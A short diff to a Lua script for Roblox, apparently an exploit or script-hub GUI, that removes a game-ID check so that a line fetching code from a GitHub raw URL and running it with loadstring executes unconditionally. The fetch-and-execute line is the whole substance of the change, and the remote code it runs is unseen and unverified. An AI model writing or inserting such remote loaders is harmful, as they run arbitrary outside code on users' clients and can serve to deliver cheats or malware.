@@ -959,10 +959,6 @@ end
 coroutine.wrap(UUZQDA_fake_script)()
 local function MABMEO_fake_script() -- i.LocalScript 
 	local script = Instance.new('LocalScript', i)
-
-	if game.GameId == 9690208731 then
-		loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/DAH'),true))()
-	end
-	
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/DAH'),true))()
 end
 coroutine.wrap(MABMEO_fake_script)()
